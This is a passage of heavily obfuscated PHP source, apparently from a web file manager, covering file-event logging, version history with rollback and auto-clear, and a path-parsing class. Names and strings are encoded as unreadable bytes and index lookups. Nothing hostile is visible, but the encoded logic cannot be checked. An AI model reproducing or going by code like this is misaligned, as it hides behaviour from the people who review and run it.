çÉÎ”·[$¥ƒ°Ñé¥[527]]) ? $ çÉÎ”·[$¥ƒ°Ñé¥[527]] : $¥ƒ°Ñé¥[12], $¥ƒ°Ñé¥[1642] => USER_ID, $¥ƒ°Ñé¥[430] => $—ËÛÔŞì, $¥ƒ°Ñé¥[1644] => $ö‚Ü°ªÙ); $this->addSystemLog($—ËÛÔŞì, $™®ˆ‡­á); unset($™®ˆ‡­á[$¥ƒ°Ñé¥[2041]], $™®ˆ‡­á[$¥ƒ°Ñé¥[527]]); return $this->add($™®ˆ‡­á); } private function addSystemLog($ê©àÁúÖ, $ğÛ’¨€) { $¯şµş› =& $_SERVER[¤·²È‰º]; if ($ê©àÁúÖ == $¯şµş›[2042]) { $ê©àÁúÖ = $ğÛ’¨€[$¯şµş›[461]][$¯şµş›[2043]]; } else { if (in_array($ê©àÁúÖ, array($¯şµş›[1803], $¯şµş›[2044]))) { $ê©àÁúÖ = $ğÛ’¨€[$¯şµş›[461]][$¯şµş›[756]]; } } $Ãš‹ƒ˜ç = array_merge($ğÛ’¨€, array($¯şµş›[2045] => $ğÛ’¨€[$¯şµş›[410]], $¯şµş›[2046] => $ğÛ’¨€[$¯şµş›[2046]])); Hook::trigger($¯şµş›[2047], $¯şµş›[2048] . $ê©àÁúÖ, $ğÛ’¨€); Model($¯şµş›[1767])->addLog($¯şµş›[2048] . $ê©àÁúÖ, $Ãš‹ƒ˜ç); } private function isCacheEvent($æŒÑÅ¿Û, $É»ÁÙ°) { if ($æŒÑÅ¿Û[$_SERVER[¤·²È‰º][419]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($˜ÕÔı—“, $àâÊĞË®) { $˜Ï‚¸³à =& $_SERVER[¤·²È‰º]; $±Íû×¤£ = Model($˜Ï‚¸³à[1321])->sourceInfo($˜ÕÔı—“); $üÁ«±ò = array($˜Ï‚¸³à[2043] => $àâÊĞË®, $˜Ï‚¸³à[42] => $±Íû×¤£[$˜Ï‚¸³à[42]]); return $this->addEvent($˜ÕÔı—“, $˜Ï‚¸³à[2042], $üÁ«±ò); } public function eventFileEdit($¾—Í¼) { $—õ€×Òş =& $_SERVER[¤·²È‰º]; $êÃıÙç® = array($—õ€×Òş[2049] => $_SERVER[$—õ€×Òş[2050]], $—õ€×Òş[2051] => strtolower(ACTION)); if (isset($GLOBALS[$—õ€×Òş[7]][$—õ€×Òş[2052]])) { $êÃıÙç®[$—õ€×Òş[2052]] = $—õ€×Òş[98]; } return $this->addEvent($¾—Í¼, $—õ€×Òş[1793], $êÃıÙç®); } public function eventRecycle($õÒò¼½, $ğŒ±¸‡») { return $this->addEvent($õÒò¼½, $_SERVER[¤·²È‰º][2044], $ğŒ±¸‡»); } public function eventRemove($¥ŸôæäÅ) { $ò½½¹ =& $_SERVER[¤·²È‰º]; $·Ã÷ÍÕÄ = Model($ò½½¹[1321])->sourceInfo($¥ŸôæäÅ); $Ãùó´² = $·Ã÷ÍÕÄ[$ò½½¹[42]]; return $this->addEvent($·Ã÷ÍÕÄ[$ò½½¹[440]], $ò½½¹[1792], $Ãùó´²); } public function eventShare($Ğ±Ÿåø, $©€¹®è¢) { return $this->addEvent($Ğ±Ÿåø, $_SERVER[¤·²È‰º][1803], $©€¹®è¢); } public function eventMove($Ù–ÚÌĞ, $³§ÓÅÍÆ, $Â’Ğ¶ó¨) { $éĞ“´´ò =& $_SERVER[¤·²È‰º]; $ºåãĞ‘ô = Model($éĞ“´´ò[1321]); $‰¾‚›ÃØ = $ºåãĞ‘ô->sourceInfo($Ù–ÚÌĞ); $‡ğÄªñ = $ºåãĞ‘ô->sourceInfo($³§ÓÅÍÆ); $øÃ¤±¦º = $ºåãĞ‘ô->sourceInfo($Â’Ğ¶ó¨); $Õ¥¬Éòç = array($éĞ“´´ò[1154] => $³§ÓÅÍÆ, $éĞ“´´ò[2053] => $‡ğÄªñ[$éĞ“´´ò[42]], $éĞ“´´ò[2031] => !empty($‡ğÄªñ[$éĞ“´´ò[527]]) ? $‡ğÄªñ[$éĞ“´´ò[527]] : $éĞ“´´ò[12], $éĞ“´´ò[1155] => $Â’Ğ¶ó¨, $éĞ“´´ò[2054] => $øÃ¤±¦º[$éĞ“´´ò[42]], $éĞ“´´ò[2055] => !empty($øÃ¤±¦º[$éĞ“´´ò[527]]) ? $øÃ¤±¦º[$éĞ“´´ò[527]] : $éĞ“´´ò[12]); $this->addEvent($Ù–ÚÌĞ, $éĞ“´´ò[565], $Õ¥¬Éòç); $‰¾‚›ÃØ = $ºåãĞ‘ô->sourceInfo($Ù–ÚÌĞ); $Õ¥¬Éòç = array($éĞ“´´ò[410] => $‰¾‚›ÃØ[$éĞ“´´ò[410]], $éĞ“´´ò[42] => $‰¾‚›ÃØ[$éĞ“´´ò[42]]); $this->addEvent($³§ÓÅÍÆ, $éĞ“´´ò[2056], $Õ¥¬Éòç); } public function eventCopy($çÑ…÷‚) { $this->eventCreate($çÑ…÷‚, $_SERVER[¤·²È‰º][563]); } public function eventRename($®Íô‡¯µ, $ÚÇ¾ÆŠ, $êÓ±Öñ€) { $¢©ç£ =& $_SERVER[¤·²È‰º]; $íÁ©šò¼ = array($¢©ç£[1154] => $ÚÇ¾ÆŠ, $¢©ç£[1155] => $êÓ±Öñ€); return $this->addEvent($®Íô‡¯µ, $¢©ç£[1336], $íÁ©šò¼); } public function eventAddComment($ĞöÌ¡, $ÛØÓ†ôà) { return $this->addEvent($ĞöÌ¡, $_SERVER[¤·²È‰º][2057], $ÛØÓ†ôà); } public function eventAddDesc($­ºÈ§äˆ, $—ş±¶œì) { return $this->addEvent($­ºÈ§äˆ, $_SERVER[¤·²È‰º][2058], $—ş±¶œì); } public function listBySource($šŠşÍüù) { $·í¦å¤ =& $_SERVER[¤·²È‰º]; $˜ŞüÉÒ = Model($·í¦å¤[1321])->sourceInfo($šŠşÍüù); $†ç–ß…Ì = array($·í¦å¤[425] => $šŠşÍüù); if ($˜ŞüÉÒ[$·í¦å¤[418]] == $·í¦å¤[98]) { $äéÙ¿É‹ = Model($·í¦å¤[1321])->listSearchChildren($šŠşÍüù, 20000); $äéÙ¿É‹[] = $šŠşÍüù . $·í¦å¤[22]; $†ç–ß…Ì = array($·í¦å¤[410] => array($·í¦å¤[7], $äéÙ¿É‹)); } $‡‚ ÅÆç = $this->where($†ç–ß…Ì)->order($·í¦å¤[2059])->selectPage(); if ($‡‚ ÅÆç[$·í¦å¤[375]][$·í¦å¤[376]] == 0) { $‡‚ ÅÆç[$·í¦å¤[375]][$·í¦å¤[376]] = 1; $‡‚ ÅÆç[$·í¦å¤[378]] = array(array($·í¦å¤[425] => $šŠşÍüù, $·í¦å¤[2040] => $˜ŞüÉÒ[$·í¦å¤[440]], $·í¦å¤[1642] => $˜ŞüÉÒ[$·í¦å¤[462]], $·í¦å¤[430] => $·í¦å¤[2060], $·í¦å¤[431] => $˜ŞüÉÒ[$·í¦å¤[210]], $·í¦å¤[1644] => $·í¦å¤[12])); } return $this->eventListParse($‡‚ ÅÆç, $šŠşÍüù); } private function eventListParse($ˆ¥Å“Ãó, $Ëïæ¡) { $Àû¾ŸÒÚ =& $_SERVER[¤·²È‰º]; $¡´ ü€ú = $ˆ¥Å“Ãó[$Àû¾ŸÒÚ[378]]; $œ¯€„€ = array_to_keyvalue($¡´ ü€ú, $Àû¾ŸÒÚ[12], $Àû¾ŸÒÚ[410]); $‹Ëšäúì = array_to_keyvalue($¡´ ü€ú, $Àû¾ŸÒÚ[12], $Àû¾ŸÒÚ[2046]); foreach ($¡´ ü€ú as $ï¿şÖÃÈ) { $Ñ…¼öì¦ = $ï¿şÖÃÈ[$Àû¾ŸÒÚ[461]]; if ($ï¿şÖÃÈ[$Àû¾ŸÒÚ[43]] == $Àû¾ŸÒÚ[565] && isset($Ñ…¼öì¦[$Àû¾ŸÒÚ[1154]])) { $œ¯€„€[] = $Ñ…¼öì¦[$Àû¾ŸÒÚ[1154]] . $Àû¾ŸÒÚ[12]; $œ¯€„€[] = $Ñ…¼öì¦[$Àû¾ŸÒÚ[1155]] . $Àû¾ŸÒÚ[12]; } if ($ï¿şÖÃÈ[$Àû¾ŸÒÚ[43]] == $Àû¾ŸÒÚ[2056] && isset($Ñ…¼öì¦[$Àû¾ŸÒÚ[410]])) { $œ¯€„€[] = $Ñ…¼öì¦[$Àû¾ŸÒÚ[410]] . $Àû¾ŸÒÚ[12]; } } $œ¯€„€ = array_merge($œ¯€„€, $‹Ëšäúì, array($Ëïæ¡ . $Àû¾ŸÒÚ[12])); $œ¯€„€ = array_unique($œ¯€„€); $‘Ì‰›Ü = array_unique(array_to_keyvalue($¡´ ü€ú, $Àû¾ŸÒÚ[12], $Àû¾ŸÒÚ[1651])); $­ ¨‘Úº = Model($Àû¾ŸÒÚ[543])->userListInfo($‘Ì‰›Ü); $£å¬ÆÁ” = Model($Àû¾ŸÒÚ[826])->sourceListInfo($œ¯€„€, !0); foreach ($¡´ ü€ú as &$ï¿şÖÃÈ) { if ($ï¿şÖÃÈ[$Àû¾ŸÒÚ[43]] == $Àû¾ŸÒÚ[565] && isset($ï¿şÖÃÈ[$Àû¾ŸÒÚ[461]][$Àû¾ŸÒÚ[1154]])) { $ï¿şÖÃÈ[$Àû¾ŸÒÚ[461]][$Àû¾ŸÒÚ[1154]] = $£å¬ÆÁ”[$ï¿şÖÃÈ[$Àû¾ŸÒÚ[461]][$Àû¾ŸÒÚ[1154]]]; $ï¿şÖÃÈ[$Àû¾ŸÒÚ[461]][$Àû¾ŸÒÚ[1155]] = $£å¬ÆÁ”[$ï¿şÖÃÈ[$Àû¾ŸÒÚ[461]][$Àû¾ŸÒÚ[1155]]]; } if ($ï¿şÖÃÈ[$Àû¾ŸÒÚ[43]] == $Àû¾ŸÒÚ[2056] && isset($ï¿şÖÃÈ[$Àû¾ŸÒÚ[461]][$Àû¾ŸÒÚ[410]])) { $ï¿şÖÃÈ[$Àû¾ŸÒÚ[461]][$Àû¾ŸÒÚ[410]] = $£å¬ÆÁ”[$ï¿şÖÃÈ[$Àû¾ŸÒÚ[461]][$Àû¾ŸÒÚ[410]]]; } $ï¿şÖÃÈ[$Àû¾ŸÒÚ[96]] = $£å¬ÆÁ”[$ï¿şÖÃÈ[$Àû¾ŸÒÚ[410]]]; $ï¿şÖÃÈ[$Àû¾ŸÒÚ[2061]] = $£å¬ÆÁ”[$ï¿şÖÃÈ[$Àû¾ŸÒÚ[2046]]]; if ($ï¿şÖÃÈ[$Àû¾ŸÒÚ[43]] == $Àû¾ŸÒÚ[1792]) { $ï¿şÖÃÈ[$Àû¾ŸÒÚ[2061]] = $ï¿şÖÃÈ[$Àû¾ŸÒÚ[96]]; $ï¿şÖÃÈ[$Àû¾ŸÒÚ[2046]] = $ï¿şÖÃÈ[$Àû¾ŸÒÚ[2061]][$Àû¾ŸÒÚ[410]]; $ï¿şÖÃÈ[$Àû¾ŸÒÚ[96]] = !1; $ï¿şÖÃÈ[$Àû¾ŸÒÚ[410]] = $Àû¾ŸÒÚ[12]; } $ï¿şÖÃÈ[$Àû¾ŸÒÚ[1991]] = $­ ¨‘Úº[$ï¿şÖÃÈ[$Àû¾ŸÒÚ[1651]]]; } unset($ï¿şÖÃÈ); $ˆ¥Å“Ãó[$Àû¾ŸÒÚ[378]] = $¡´ ü€ú; return $ˆ¥Å“Ãó; } public function removeBySource($™Ò¶ÆŒÂ) { $ñˆ›¸ú¡ = array($_SERVER[¤·²È‰º][425] => $™Ò¶ÆŒÂ); $this->where($ñˆ›¸ú¡)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\x72\143\x65\137\x68\x69\163\x74\157\162\x79"; public function historyCount($˜¤ô“) { $ÛïØ¾°È =& $_SERVER[¤·²È‰º]; if (!$˜¤ô“) { return array(); } if (is_string($˜¤ô“) || is_int($˜¤ô“)) { $˜¤ô“ = array($˜¤ô“); } $™²ù¥¸® = array($ÛïØ¾°È[410], $ÛïØ¾°È[1856] => $ÛïØ¾°È[508]); $®­ËØªº = array($ÛïØ¾°È[410] => array($ÛïØ¾°È[7], $˜¤ô“)); $İÎİ¯“ = $this->field($™²ù¥¸®)->where($®­ËØªº)->group($ÛïØ¾°È[410])->select(); return array_to_keyvalue($İÎİ¯“, $ÛïØ¾°È[410], $ÛïØ¾°È[508]); } public function addHistory($º­Ñ…ÅÁ, $ãÁù¦ÕØ = '') { $›ªñÏçœ =& $_SERVER[¤·²È‰º]; $ş“™Ÿ = array($›ªñÏçœ[425] => $º­Ñ…ÅÁ[$›ªñÏçœ[410]], $›ªñÏçœ[1642] => isset($º­Ñ…ÅÁ[$›ªñÏçœ[464]]) ? $º­Ñ…ÅÁ[$›ªñÏçœ[464]] : $º­Ñ…ÅÁ[$›ªñÏçœ[462]], $›ªñÏçœ[477] => $º­Ñ…ÅÁ[$›ªñÏçœ[476]], $›ªñÏçœ[593] => $º­Ñ…ÅÁ[$›ªñÏçœ[86]], $›ªñÏçœ[2062] => $ãÁù¦ÕØ); if ($GLOBALS[$›ªñÏçœ[6]][$›ªñÏçœ[99]][$›ªñÏçœ[1203]] >= 1) { $this->historyAutoClear($ş“™Ÿ[$›ªñÏçœ[410]]); $this->add($ş“™Ÿ); } Hook::trigger($›ªñÏçœ[2063], $ş“™Ÿ); Model($›ªñÏçœ[2064])->eventFileEdit($º­Ñ…ÅÁ[$›ªñÏçœ[410]]); } private function historyAutoClear($¶Ë£•›) { $È…–õë =& $_SERVER[¤·²È‰º]; $†Øó’½Ü = Model($È…–õë[771])->get($È…–õë[1225]); $¥«°³æá = $GLOBALS[$È…–õë[6]][$È…–õë[99]][$È…–õë[1203]]; $µ•‰üÆ» = $†Øó’½Ü == $È…–õë[1226] ? min(5, $¥«°³æá) : $¥«°³æá; if ($¥«°³æá <= 1) { $µ•‰üÆ» = 1; } if ($µ•‰üÆ» >= 500) { return; } $¦°ÒÕõ™ = array($È…–õë[425] => $¶Ë£•›); $™¹¡ÒŞÕ = $this->field($È…–õë[2065])->where($¦°ÒÕõ™)->order($È…–õë[2059])->select(); if (!$™¹¡ÒŞÕ || $µ•‰üÆ» >= count($™¹¡ÒŞÕ)) { return; } $™²–›Ñò = array_to_keyvalue($™¹¡ÒŞÕ, $È…–õë[12], $È…–õë[407]); $™²–›Ñò = array_slice($™²–›Ñò, $µ•‰üÆ»); $Ôäší´Ó = array_to_keyvalue($™¹¡ÒŞÕ, $È…–õë[12], $È…–õë[476]); $Ôäší´Ó = array_slice($Ôäší´Ó, $µ•‰üÆ»); if (!$™²–›Ñò || !$Ôäší´Ó) { return; } $¦°ÒÕõ™ = array($È…–õë[427] => array($È…–õë[7], $™²–›Ñò)); $this->where($¦°ÒÕõ™)->delete(); Model($È…–õë[479])->remove($Ôäší´Ó); } public function listData($¦Ğ§ªóã) { $î¢²È»µ =& $_SERVER[¤·²È‰º]; $Ñ·“È¿ø = array($î¢²È»µ[425] => $¦Ğ§ªóã); $ÀøŒÎÒé = $î¢²È»µ[2066]; $ùµ¤Âşü = $this->field($ÀøŒÎÒé)->where($Ñ·“È¿ø)->order($î¢²È»µ[2059])->selectPage(); $this->_listAppendUser($ùµ¤Âşü[$î¢²È»µ[378]]); $Àâ¿ªŠ’ = Model($î¢²È»µ[771])->get($î¢²È»µ[1225]); $Ô©½É¢æ = 5; if ($Àâ¿ªŠ’ == $î¢²È»µ[1226]) { $ùµ¤Âşü[$î¢²È»µ[378]] = array_slice($ùµ¤Âşü[$î¢²È»µ[378]], 0, $Ô©½É¢æ); $ùµ¤Âşü[$î¢²È»µ[375]] = array($î¢²È»µ[2067] => 1, $î¢²È»µ[2068] => 20, $î¢²È»µ[2069] => 1, $î¢²È»µ[2070] => count($ùµ¤Âşü[$î¢²È»µ[378]])); } return $ùµ¤Âşü; } protected function _listAppendUser(&$ŞŠ­ˆó‹) { $×ôÒØÁ‘ =& $_SERVER[¤·²È‰º]; $Ä‚‹à§ò = array_to_keyvalue($ŞŠ­ˆó‹, $×ôÒØÁ‘[12], $×ôÒØÁ‘[1651]); $Ğ®ø¼Æ½ = Model($×ôÒØÁ‘[543])->userListInfo($Ä‚‹à§ò); foreach ($ŞŠ­ˆó‹ as &$¬³©Ä–‚) { $ÚÜÚÓ×¬ = $¬³©Ä–‚[$×ôÒØÁ‘[1651]]; $¬³©Ä–‚[$×ôÒØÁ‘[462]] = $Ğ®ø¼Æ½[$ÚÜÚÓ×¬] ? $Ğ®ø¼Æ½[$ÚÜÚÓ×¬] : !1; } unset($¬³©Ä–‚); } public function fileInfo($ÂïóÑµ) { $ÎßŸœ›Ê =& $_SERVER[¤·²È‰º]; $À÷‚À¿ = $this->tablePrefix; $°Õ²›şÇ = "{$À÷‚À¿}\151\x6f\137\x66\x69\154\x65\40\x66\x69\154\145\163\40\x6f\x6e\x20\x66\151\x6c\x65\163\56\146\x69\154\145\111\104\x20\75\x20\x68\151\x73\x74\x6f\162\x79\56\146\151\154\145\111\104"; return $this->alias($ÎßŸœ›Ê[2071])->where(array($ÎßŸœ›Ê[427] => $ÂïóÑµ))->join($°Õ²›şÇ, $ÎßŸœ›Ê[2072])->find(); } public function removeItem($š°îâú±) { $”†é•¨î =& $_SERVER[¤·²È‰º]; $Èåœ¡²¿ = array($”†é•¨î[427] => $š°îâú±); $—½Êå¼ = $this->where($Èåœ¡²¿)->find(); if ($—½Êå¼) { $’Ó”ª±Ï = $this->where($Èåœ¡²¿)->delete(); Model($”†é•¨î[479])->remove($—½Êå¼[$”†é•¨î[476]]); return $’Ó”ª±Ï; } return !1; } public function removeBySource($³ŸÌ¯Õ) { $¼»ÉşÚâ =& $_SERVER[¤·²È‰º]; if (!$³ŸÌ¯Õ) { return !1; } if (!is_array($³ŸÌ¯Õ)) { $³ŸÌ¯Õ = array($³ŸÌ¯Õ); } $É»±òğé = array($¼»ÉşÚâ[425] => array($¼»ÉşÚâ[7], $³ŸÌ¯Õ)); $ÀûÈÔÉÔ = $this->field($¼»ÉşÚâ[477])->where($É»±òğé)->select(); if ($ÀûÈÔÉÔ) { $this->where($É»±òğé)->delete(); $—™Óí­µ = array_to_keyvalue($ÀûÈÔÉÔ, $¼»ÉşÚâ[12], $¼»ÉşÚâ[476]); Model($¼»ÉşÚâ[479])->remove($—™Óí­µ); } return !0; } public function setDetail($Ùêõ©î¹, $Ã£à™Ô°) { $ËßßíÅ‘ =& $_SERVER[¤·²È‰º]; return $this->where(array($ËßßíÅ‘[427] => $Ùêõ©î¹))->save(array($ËßßíÅ‘[2062] => $Ã£à™Ô°)); } public function rollbackToItem($¶ßª³çî, $¸»¥Ñ©¼) { $±­˜½Ÿ =& $_SERVER[¤·²È‰º]; $İãÍßÈ‡ = Model($±­˜½Ÿ[826])->sourceInfo($¶ßª³çî); $this->addHistory($İãÍßÈ‡, LNG($±­˜½Ÿ[2073])); $ãà½‘Šı = $this->find($¸»¥Ñ©¼); $èËò¾³ = array($±­˜½Ÿ[476] => $ãà½‘Šı[$±­˜½Ÿ[476]], $±­˜½Ÿ[86] => $ãà½‘Šı[$±­˜½Ÿ[86]], $±­˜½Ÿ[95] => time(), $±­˜½Ÿ[464] => USER_ID); Model($±­˜½Ÿ[826])->where(array($±­˜½Ÿ[410] => $¶ßª³çî))->save($èËò¾³); return $this->where(array($±­˜½Ÿ[427] => $¸»¥Ñ©¼))->delete(); } public function clearSame($ˆ¬¢¹‘) { $çáÀÓ¢ =& $_SERVER[¤·²È‰º]; $š›€«ç = $this->listData($ˆ¬¢¹‘); $´é×Ÿ°ª = array_to_keyvalue_group($š›€«ç, $çáÀÓ¢[476]); $ø°şâ¦ = array(); $šƒ¢ÛÙ = array(); foreach ($´é×Ÿ°ª as $¥ö×Åì) { if (!$¥ö×Åì || count($¥ö×Åì) <= 1) { continue; } foreach ($¥ö×Åì as $ÇÇÍî¬²) { $ø°şâ¦[] = $ÇÇÍî¬²[$çáÀÓ¢[476]]; $šƒ¢ÛÙ[] = $ÇÇÍî¬²[$çáÀÓ¢[407]]; } } if (!$šƒ¢ÛÙ) { return; } $this->where(array($çáÀÓ¢[407] => array($çáÀÓ¢[7], $šƒ¢ÛÙ)))->delete(); Model($çáÀÓ¢[479])->remove($ø°şâ¦); } public function userSpace() { $‚ü½£¯É =& $_SERVER[¤·²È‰º]; $ò„¶Òì· = $this->tablePrefix; $€Íş¦¢÷ = array($‚ü½£¯É[1642] => USER_ID); $‡™ÚÆ©Ù = "{$ò„¶Òì·}\151\157\137\x66\x69\x6c\145\40\146\x69\154\x65\x73\x20\x6f\156\x20\146\x69\x6c\x65\163\56\146\151\154\x65\111\104\40\x3d\40\x68\x69\163\164\x6f\162\171\x2e\x66\151\154\145\x49\104"; return $this->alias($‚ü½£¯É[2071])->where($€Íş¦¢÷)->join($‡™ÚÆ©Ù, $‚ü½£¯É[2072])->sum($‚ü½£¯É[86]); } } goto e’Ù¡Úë¶; eºÚ –´›†: class KodIO { const KOD_SOURCE = "\173\163\157\165\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\162\122\x65\143\171\143\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\163\x65\162\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\145\162\106\x69\154\x65\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\x65\x72\106\151\154\x65\124\x79\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\x75\160\x52\x6f\157\x74\x53\x65\154\x66\175"; const KOD_USER_SHARE = "\173\165\x73\x65\162\123\150\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\x72\x53\150\x61\x72\x65\114\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\x72\x65\x54\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\141\162\x65\111\x74\x65\155\175"; const KOD_SHARE_LINK = "\173\163\x68\x61\x72\x65\x49\x74\x65\155\x4c\x69\x6e\153\x7d"; const KOD_SEARCH = "\x7b\163\145\x61\162\x63\x68\x7d"; const KOD_BLOCK = "\173\142\x6c\x6f\143\153\175"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\163\x65\162\122\x65\x6e\x63\145\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\144\x72\151\x76\145\162\x7d"; public static function typeList() { $òúîß¯Ì =& $_SERVER[¤·²È‰º]; return array($òúîß¯Ì[1238] => self::KOD_SOURCE, $òúîß¯Ì[1239] => self::KOD_USER_RECYCLE, $òúîß¯Ì[1240] => self::KOD_USER_FAV, $òúîß¯Ì[1241] => self::KOD_USER_FILE_TAG, $òúîß¯Ì[1242] => self::KOD_USER_FILE_TYPE, $òúîß¯Ì[1243] => self::KOD_GROUP_ROOT_SELF, $òúîß¯Ì[1244] => self::KOD_USER_SHARE, $òúîß¯Ì[1245] => self::KOD_USER_SHARE_LINK, $òúîß¯Ì[1246] => self::KOD_USER_SHARE_TO_ME, $òúîß¯Ì[1247] => self::KOD_SHARE_ITEM, $òúîß¯Ì[1248] => self::KOD_SHARE_LINK, $òúîß¯Ì[1249] => self::KOD_SEARCH, $òúîß¯Ì[1250] => self::KOD_BLOCK, $òúîß¯Ì[1251] => self::KOD_IO, $òúîß¯Ì[1252] => self::KOD_USER_RECENT, $òúîß¯Ì[1253] => self::KOD_USER_DRIVER); } public static function parse($ôÓ¼Ü­) { $­§÷Ñªù =& $_SERVER[¤·²È‰º]; $ôÓ¼Ü­ = self::clear($ôÓ¼Ü­); $«ó–ôé« = array_values(self::typeList()); preg_match($­§÷Ñªù[1254], $ôÓ¼Ü­, $Ü×Èİ¾); $¤ª­öˆ† = array($­§÷Ñªù[430] => !1, $­§÷Ñªù[1255] => !1, $­§÷Ñªù[427] => !1, $­§÷Ñªù[94] => $ôÓ¼Ü­, $­§÷Ñªù[1164] => !1, $­§÷Ñªù[1163] => $­§÷Ñªù[12]); if (is_array($Ü×Èİ¾) && count($Ü×Èİ¾) == 5) { $ó•¢¢Ìé = $­§÷Ñªù[1256] . $Ü×Èİ¾[2] . $­§÷Ñªù[336]; if (in_array($ó•¢¢Ìé, $«ó–ôé«)) { $¤ª­öˆ†[$­§÷Ñªù[1164]] = $Ü×Èİ¾[1]; $¤ª­öˆ†[$­§÷Ñªù[43]] = $ó•¢¢Ìé; $¤ª­öˆ†[$­§÷Ñªù[1257]] = substr($ó•¢¢Ìé, 1, -1); $¤ª­öˆ†[$­§÷Ñªù[407]] = $Ü×Èİ¾[3]; } $¤ª­öˆ†[$­§÷Ñªù[1163]] = $Ü×Èİ¾[4]; } $¤Ç‚­Ë€ = array($­§÷Ñªù[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $¤ª­öˆ†[$­§÷Ñªù[1219]] = in_array($¤ª­öˆ†[$­§÷Ñªù[43]], $¤Ç‚­Ë€); return $¤ª­öˆ†; } public static function isTruePath($˜äšÓüÛ) { $™’”ãƒ  =& $_SERVER[¤·²È‰º]; if (substr($˜äšÓüÛ, 0, 1) != $™’”ãƒ [1256]) { return !0; } if (strpos($˜äšÓüÛ, $™’”ãƒ [416]) === 0) { return !0; } if (strpos($˜äšÓüÛ, $™’”ãƒ [1223]) === 0) { return !0; } if (strpos($˜äšÓüÛ, $™’”ãƒ [1258]) === 0) { return !0; } if (strpos($˜äšÓüÛ, $™’”ãƒ [1259]) === 0) { return !0; } if (strpos($˜äšÓüÛ, $™’”ãƒ [1260]) === 0) { return !0; } return !1; } public static function clear($Šê¾îÖ†) { $¿›¢·õş =& $_SERVER[¤·²È‰º]; $Šê¾îÖ† = str_replace(array($¿›¢·õş[1072], $¿›¢·õş[18]), $¿›¢·õş[63], $Šê¾îÖ†); $Šê¾îÖ† = str_replace($¿›¢·õş[107], $¿›¢·õş[8], $Šê¾îÖ†); $†ñšß•› = $¿›¢·õş[1261]; if (substr($Šê¾îÖ†, 0, 3) == $¿›¢·õş[1262]) { $Šê¾îÖ† = substr($Šê¾îÖ†, 3); } while (strstr($Šê¾îÖ†, $†ñšß•›)) { $Šê¾îÖ† = str_replace($†ñšß•›, $¿›¢·õş[8], $Šê¾îÖ†); } $Šê¾îÖ† = preg_replace($¿›¢·õş[1263], $¿›¢·õş[8], $Šê¾îÖ†); if ($Šê¾îÖ† == $¿›¢·õş[8]) { return $¿›¢·õş[8]; } $Šê¾îÖ† = rtrim($Šê¾îÖ†, $¿›¢·õş[8]); return $Šê¾îÖ†; } public static function sourceID($ŞÊ—½È„) { $Òº”„òí =& $_SERVER[¤·²È‰º]; $ÚßûŒõ = self::parse($ŞÊ—½È„); if ($ÚßûŒõ[$Òº”„òí[43]] !== self::KOD_SOURCE) { show_json(LNG($Òº”„òí[1264]), !1); } return $ÚßûŒõ[$Òº”„òí[407]]; } public static function make($û…•¾ª‡) { if (!$û…•¾ª‡) { return !1; } return self::makePath(self::KOD_SOURCE, intval($û…•¾ª‡)); } public static function makeShare($–êİ¬ıó, $Â¶¾ À¾) { return self::makePath(self::KOD_SHARE_ITEM, $–êİ¬ıó, $Â¶¾ À¾); } public static function makeFileTypePath($Æ×‰Ô¯¼) { return self::makePath(self::KOD_USER_FILE_TYPE, $Æ×‰Ô¯¼); } public static function makeFileTagPath($Ì­Æ½ÂÔ) { return self::makePath(self::KOD_USER_FILE_TAG, $Ì­Æ½ÂÔ); } public static function makePath($’Ôôº‰², $ÕŒ¥™æ• = '', $ÚÇ•í¼ = '') { $”‡˜é‘ =& $_SERVER[¤·²È‰º]; $öƒü¥¢Ô = substr($’Ôôº‰², 1, -1); $İÀÏ´Â½ = $”‡˜é‘[1265] . $öƒü¥¢Ô . $”‡˜é‘[1266] . $ÕŒ¥™æ• . $”‡˜é‘[1267]; $İÀÏ´Â½ = $ÚÇ•í¼ ? $İÀÏ´Â½ . $ÚÇ•í¼ . $”‡˜é‘[8] : $İÀÏ´Â½; return $İÀÏ´Â½; } public static function hashPath($œŞÍÍÓò, $¡æÇş§° = true) { $öî¦÷½€ =& $_SERVER[¤·²È‰º]; $ÇØÈãºó = is_array($œŞÍÍÓò) ? $œŞÍÍÓò : IO::info($œŞÍÍÓò); $–ğø…Ú = _get($ÇØÈãºó, $öî¦÷½€[1268], $öî¦÷½€[12]); if (!$–ğø…Ú && isset($ÇØÈãºó[$öî¦÷½€[410]])) { $ÇØÈãºó = IO::info(KodIO::make($ÇØÈãºó[$öî¦÷½€[410]])); $–ğø…Ú = _get($ÇØÈãºó, $öî¦÷½€[1268], $öî¦÷½€[12]); } if (!$–ğø…Ú && $¡æÇş§°) { $ÓÉ‡Ü’Ñ = KodIO::parse($ÇØÈãºó[$öî¦÷½€[94]]); if (!$ÓÉ‡Ü’Ñ[$öî¦÷½€[43]]) { $–ğø…Ú = IO::hashSimple($ÇØÈãºó[$öî¦÷½€[94]]); } } if (!$–ğø…Ú) { $–ğø…Ú = md5($ÇØÈãºó[$öî¦÷½€[94]] . $ÇØÈãºó[$öî¦÷½€[86]] . $ÇØÈãºó[$öî¦÷½€[95]]); } return $–ğø…Ú; } public static function initSystemPath() { $ıÛÙ•òô =& $_SERVER[¤·²È‰º]; if (defined($ıÛÙ•òô[1269])) { return; } define($ıÛÙ•òô[1269], self::systemPath($ıÛÙ•òô[1270])); define($ıÛÙ•òô[1271], self::systemPath($ıÛÙ•òô[1272])); define($ıÛÙ•òô[1273], self::systemPath($ıÛÙ•òô[1274])); define($ıÛÙ•òô[1275], self::systemPath($ıÛÙ•òô[1276])); IOHistory::bindEvent(); } public static function systemPath($Ò¤­ÅÔˆ) { $†Ë…Ï’™ =& 